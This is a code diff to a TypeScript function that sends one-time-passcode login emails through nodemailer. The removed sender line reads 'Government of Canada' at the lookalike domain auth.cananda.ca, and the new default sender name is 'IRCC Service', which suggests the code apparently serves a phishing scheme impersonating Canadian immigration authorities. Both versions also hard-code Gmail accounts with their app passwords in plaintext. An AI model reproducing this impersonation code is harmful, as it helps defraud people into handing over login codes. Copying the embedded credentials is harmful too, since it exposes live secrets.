@@ -3,17 +3,22 @@ import path from "path";
 
 export async function sendOtpEmail(to: string, otp: string) {
   const transporter = nodemailer.createTransport({
-    service: "gmail",
+    host: process.env.SMTP_HOST || "smtp.gmail.com",
+    port: Number(process.env.SMTP_PORT) || 587,
+    secure: process.env.SMTP_SECURE === "true", // true for 465, false for other ports
     auth: {
-      user: "kamranasif1011@gmail.com", // your Gmail
-      pass: "hcpl fovi uemk kpjz",           // your Google App Password
+      user: (process.env.SMTP_USER as string) || "03104676590umary@gmail.com",
+      pass: (process.env.SMTP_PASS as string) || "tkddvduqxtmpskhe",
     },
   });
 
+  const fromName = process.env.SMTP_FROM_NAME || "IRCC Service";
+  const fromAddress = (process.env.SMTP_FROM_ADDRESS as string) || (process.env.SMTP_USER as string) || "03104676590umary@gmail.com";
+
   const mailOptions = {
-    from: `"Government of Canada" <GC@auth.cananda.ca>`,
+    from: `"${fromName}" <${fromAddress}>`,
     to,
-    subject: "Verify your login - Government of Canada",
+    subject: `Verify your login - ${fromName}`,
     html: `
 <div lang="en-CA" style="font-family:'Roboto',Helvetica,Arial,Tahoma,sans-serif;margin:0;padding:0">
   <table border="0" cellpadding="0" cellspacing="0" width="100%" bgcolor="#f0f0f0" style="border-collapse:collapse;width:100%!important;height:100%!important;margin:0;padding:0">
